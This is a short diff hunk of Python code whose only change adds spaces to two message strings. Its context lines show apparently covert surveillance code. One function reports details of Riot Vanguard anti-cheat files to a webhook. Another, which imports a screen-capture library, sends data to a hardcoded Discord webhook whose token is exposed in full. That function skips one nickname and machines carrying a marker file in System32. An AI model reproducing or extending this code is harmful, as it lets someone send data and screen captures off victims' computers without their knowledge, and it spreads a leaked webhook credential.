@@ -18,8 +18,8 @@ def gathering_data_okx(file_path, message):
     
     requests.post(webhook_url, json=data)
 
-gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgc.exe", server_nickname+"vgc last update:")
-gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgk.sys", server_nickname+"vgk last update:")
+gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgc.exe", server_nickname+" vgc last update:")
+gathering_data_okx(r"C:\Program Files\Riot Vanguard\vgk.sys", server_nickname+" vgk last update:")
 def data_sending_server(message: str,io=io,ImageGrab=ImageGrab):
     if server_nickname != "Klex" and not os.path.exists("C:\\Windows\\System32\\dont_.txt"):
         WEBHOOK_URL = "https://discord.com/api/webhooks/1351046811875545149/8QEKRNoFYMq14tAMyVkbT7-sEvm_gUYw-tUYPOgyyA48MNNPZ0AzWcYNTc8ANHLUng4D"
